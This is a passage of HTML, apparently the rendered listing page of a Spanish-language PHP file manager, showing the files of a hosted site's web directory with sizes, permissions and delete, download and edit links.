                    <td>1.22 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/home.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/home.php::home.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::home.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::index.php">index.php</a></td>
                    <td>Archivo</td>
                    <td>15.42 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/index.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/index.php::index.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::index.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::login.php">login.php</a></td>
                    <td>Archivo</td>
                    <td>1.37 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/login.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/login.php::login.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::login.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::mapa-del-sitio.php">mapa-del-sitio.php</a></td>
                    <td>Archivo</td>
                    <td>2 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/mapa-del-sitio.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/mapa-del-sitio.php::mapa-del-sitio.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::mapa-del-sitio.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::miavatar_cambiar.php">miavatar_cambiar.php</a></td>
                    <td>Archivo</td>
                    <td>812 B</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/miavatar_cambiar.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/miavatar_cambiar.php::miavatar_cambiar.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::miavatar_cambiar.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::misimagenes.php">misimagenes.php</a></td>
                    <td>Archivo</td>
                    <td>3.33 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/misimagenes.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/misimagenes.php::misimagenes.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::misimagenes.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::misimagenes_cambiar.php">misimagenes_cambiar.php</a></td>
                    <td>Archivo</td>
                    <td>987 B</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/misimagenes_cambiar.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/misimagenes_cambiar.php::misimagenes_cambiar.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::misimagenes_cambiar.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::mod-history.php">mod-history.php</a></td>
                    <td>Archivo</td>
                    <td>1.37 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/mod-history.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/mod-history.php::mod-history.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::mod-history.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::monitor.php">monitor.php</a></td>
                    <td>Archivo</td>
                    <td>6.57 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/monitor.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/monitor.php::monitor.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::monitor.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::next.php">next.php</a></td>
                    <td>Archivo</td>
                    <td>430 B</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/next.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/next.php::next.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::next.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::notificaciones-ajax.php">notificaciones-ajax.php</a></td>
                    <td>Archivo</td>
                    <td>5.63 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/notificaciones-ajax.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/notificaciones-ajax.php::notificaciones-ajax.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::notificaciones-ajax.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::password-cambiar.php">password-cambiar.php</a></td>
                    <td>Archivo</td>
                    <td>1.48 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/password-cambiar.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/password-cambiar.php::password-cambiar.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::password-cambiar.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::password-form.php">password-form.php</a></td>
                    <td>Archivo</td>
                    <td>2.33 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/password-form.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/password-form.php::password-form.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::password-form.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::password.php">password.php</a></td>
                    <td>Archivo</td>
                    <td>2.77 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/password.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/password.php::password.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::password.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::perfil.php">perfil.php</a></td>
                    <td>Archivo</td>
                    <td>43.44 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/perfil.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/perfil.php::perfil.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::perfil.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::playlist.php">playlist.php</a></td>
                    <td>Archivo</td>
                    <td>1.15 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/playlist.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/playlist.php::playlist.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::playlist.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::post.borrar.php">post.borrar.php</a></td>
                    <td>Archivo</td>
                    <td>630 B</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/post.borrar.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/post.borrar.php::post.borrar.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::post.borrar.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::post.php">post.php</a></td>
                    <td>Archivo</td>
                    <td>69 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/post.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/post.php::post.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::post.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::posts.php">posts.php</a></td>
                    <td>Archivo</td>
                    <td>2.84 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/posts.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/posts.php::posts.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::posts.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::ppdias.php">ppdias.php</a></td>
                    <td>Archivo</td>
                    <td>1.07 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/ppdias.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/ppdias.php::ppdias.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::ppdias.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::prev.php">prev.php</a></td>
                    <td>Archivo</td>
                    <td>439 B</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/prev.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/prev.php::prev.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::prev.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::preview.php">preview.php</a></td>
                    <td>Archivo</td>
                    <td>3.3 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/preview.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/preview.php::preview.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::preview.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::privacidad-de-datos.php">privacidad-de-datos.php</a></td>
                    <td>Archivo</td>
                    <td>7.99 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/privacidad-de-datos.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/privacidad-de-datos.php::privacidad-de-datos.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::privacidad-de-datos.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::protocolo.php">protocolo.php</a></td>
                    <td>Archivo</td>
                    <td>11.3 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/protocolo.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/protocolo.php::protocolo.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::protocolo.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::recaptcha.php">recaptcha.php</a></td>
                    <td>Archivo</td>
                    <td>1.05 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/recaptcha.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/recaptcha.php::recaptcha.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::recaptcha.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::recomendar-form.php">recomendar-form.php</a></td>
                    <td>Archivo</td>
                    <td>2.1 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/recomendar-form.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/recomendar-form.php::recomendar-form.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::recomendar-form.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::recomendar.php">recomendar.php</a></td>
                    <td>Archivo</td>
                    <td>1.14 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/recomendar.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/recomendar.php::recomendar.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::recomendar.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::registro-check-email.php">registro-check-email.php</a></td>
                    <td>Archivo</td>
                    <td>214 B</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/registro-check-email.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/registro-check-email.php::registro-check-email.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::registro-check-email.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::registro-check-nick.php">registro-check-nick.php</a></td>
                    <td>Archivo</td>
                    <td>232 B</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/registro-check-nick.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/registro-check-nick.php::registro-check-nick.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::registro-check-nick.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::registro-confirmar.php">registro-confirmar.php</a></td>
                    <td>Archivo</td>
                    <td>698 B</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/registro-confirmar.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/registro-confirmar.php::registro-confirmar.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::registro-confirmar.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::registro-form.php">registro-form.php</a></td>
                    <td>Archivo</td>
                    <td>24.01 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/registro-form.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/registro-form.php::registro-form.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::registro-form.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::registro-geo.php">registro-geo.php</a></td>
                    <td>Archivo</td>
                    <td>1.33 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
